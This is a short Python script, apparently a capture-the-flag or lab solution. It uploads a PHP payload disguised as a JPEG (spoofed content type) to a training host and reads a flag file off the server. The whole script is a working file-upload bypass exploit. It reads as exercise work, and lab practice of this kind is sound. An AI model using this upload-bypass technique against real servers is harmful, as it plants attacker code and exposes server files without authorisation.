import requests

url = "http://test-s3.web0x05.hbtn/task2/"
php_payload = '<?php readfile("FLAG_2.txt"); ?>'

files = {
    'file': ('exploit2.php', php_payload, 'image/jpeg')
}

response = requests.post(url, files=files)
print("Serverin Yükləmə Cavabı:")
print(response.text)
